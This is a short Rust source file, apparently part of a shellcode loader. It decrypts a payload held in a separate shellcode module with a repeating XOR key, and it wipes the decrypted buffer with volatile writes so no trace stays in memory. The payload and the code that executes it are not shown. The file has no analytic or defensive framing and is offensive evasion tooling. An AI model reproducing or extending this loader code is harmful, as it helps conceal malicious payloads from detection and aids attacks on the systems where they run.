use crate::shellcode;

pub fn extract_shellcode() -> Vec<u8> {
    let mut buf = shellcode::shellcode.to_vec();
    let key = &shellcode::key;
    for i in 0..buf.len() {
        buf[i] ^= key[i % key.len()];
    }
    buf
}

pub fn wipe(buf: &mut Vec<u8>) {
    for b in buf.iter_mut() {
        unsafe { std::ptr::write_volatile(b, 0) };
    }
    buf.clear();
}
